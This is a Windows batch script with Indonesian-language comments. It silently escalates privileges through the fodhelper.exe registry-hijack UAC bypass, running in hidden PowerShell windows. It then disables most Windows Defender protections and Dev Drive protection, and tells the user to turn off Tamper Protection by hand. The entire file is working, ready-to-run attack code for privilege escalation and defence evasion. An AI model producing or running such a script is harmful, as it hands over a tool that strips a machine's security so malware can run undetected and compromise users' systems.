@echo off
setlocal EnableDelayedExpansion

:: ===============================
:: === CEK ADMINISTRATOR ===
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Membutuhkan hak Administrator - mencoba bypass UAC...

    set "bypassFile=%TEMP%\bypass_uac.ps1"

    :: Buat file PowerShell sementara
    > "%bypassFile%" (
        echo $bat = '%~f0'
        echo $arg = 'elevated'
        echo $cmd = "powershell -WindowStyle Hidden -Command Start-Process `"$bat`" -ArgumentList `"$arg`""
        echo New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Force ^| Out-Null
        echo Set-ItemProperty "HKCU:\Software\Classes\.pwn\Shell\Open\command" -Name "(default)" -Value $cmd -Force
        echo New-Item -Path "HKCU:\Software\Classes\ms-settings\CurVer" -Force ^| Out-Null
        echo Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force
        echo Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    )

    powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%bypassFile%"
    timeout /t 5 >nul
    exit /b
)

:: ===============================
:: === DISABLE WINDOWS DEFENDER ===

echo [*] Menonaktifkan Windows Defender Protection...

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell -Command "Set-MpPreference -MAPSReporting 0"
powershell -Command "Set-MpPreference -SubmitSamplesConsent 2"
powershell -Command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
powershell -Command "Set-MpPreference -DisableScriptScanning $true"

:: Dev Drive Protection (Windows 11)
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\DevDrive" /v "EnableDevDriveProtection" /t REG_DWORD /d 0 /f >nul 2>&1

echo.
echo [*] Semua perlindungan utama telah dimatikan (kecuali Tamper Protection).
echo [!] Tamper Protection harus dinonaktifkan manual via GUI: 
echo     Windows Security > Virus & Threat Protection > Manage Settings > Tamper Protection
echo.
pause
exit /b
